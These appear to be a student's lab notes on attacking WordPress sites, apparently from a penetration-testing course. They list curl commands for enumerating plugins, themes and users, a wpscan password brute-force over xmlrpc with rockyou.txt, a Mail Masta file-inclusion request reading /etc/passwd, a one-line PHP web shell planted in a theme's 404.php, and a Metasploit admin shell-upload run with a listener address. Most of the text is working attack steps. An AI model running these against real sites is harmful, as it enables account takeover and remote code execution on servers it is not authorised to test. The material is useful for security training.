tree -L 1 /var/www/html

/wp-admin/login.php
/wp-admin/wp-login.php
/login.php
/wp-login.php
xmlrpc.php =  is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. xmlrpc on WordPress is actually an API that allows developers who make 3rd party application and services the ability to interact to your WordPress site

wp-config.php 
The wp-content folder is the main directory where plugins and themes are stored:
tree -L 1 /var/www/html/wp-content

wp-includes contains everything except for the administrative components and the themes that belong to the website:
tree -L 1 /var/www/html/wp-includes

Enumeration---------------------------------
1.View page source-> search for meta generator
curl -s -X GET http://94.237.54.170:51455/ | grep '<meta name="generator"' 
readme.html

Plugins:
curl -s -X GET http://94.237.54.170:51455/ | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
Themes:
curl -s -X GET http://94.237.54.170:51455/  | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
Plugins Active Enumeration:
curl -I -X GET http://94.237.54.170:51455/wp-content/plugins/mail-masta
curl -I -X GET http://94.237.54.170:51455/wp-content/plugins/someplugin

 Directory Indexing-------------
 curl -s -X GET http://94.237.54.170:51455/wp-content/plugins/mail-masta/ | html2text

 User Enumeration----------------
 1. The first method is reviewing posts to uncover the ID assigned to the user and their corresponding username. If we mouse over the post author link titled "by admin,"
 Confirm with -> http://blog.inlanefreight.com/?author=1
 curl -s -I -X GET http://example.com/?author=1  ==> check Location:
 curl -s -I -X GET http://example.com/?author=100 ==> non-existing User

 2. curl http://example.com/wp-json/wp/v2/users | jq

 Login -------------------------------------
 Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the xmlrpc.php page.

POST /xmlrpc.php HTTP/1.1
Host: 94.237.53.3:30333
https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

wpscan --hh
https://wpscan.com/ = WPVulvDB
WPScan Enumeration:
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>

wpscan --url http://94.237.53.3:30333  --enumerate ap

Exploiting a Vulnerable Plugin----------------------
https://www.exploit-db.com/exploits/40290 == Mail Masta 1.0 vulns
http://IP/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd -> view source 

Attacking WordPress Users
The scan report returned three users registered on the website: admin, roger, and david.
wpscan --password-attack xmlrpc -t 20 -U admin, david -P rockyou.txt --url http://example.com

Remote Code Execution (RCE) via the Theme Editor
Twenty Seventeen Theme - 404.php
<?php
system($_GET['cmd']);

curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

Attacking WordPress with Metasploit--------------
msfconsole
search wp_admin ==> exploit/unix/webapp/wp_admin_shell_upload => use 0
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts example.com
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
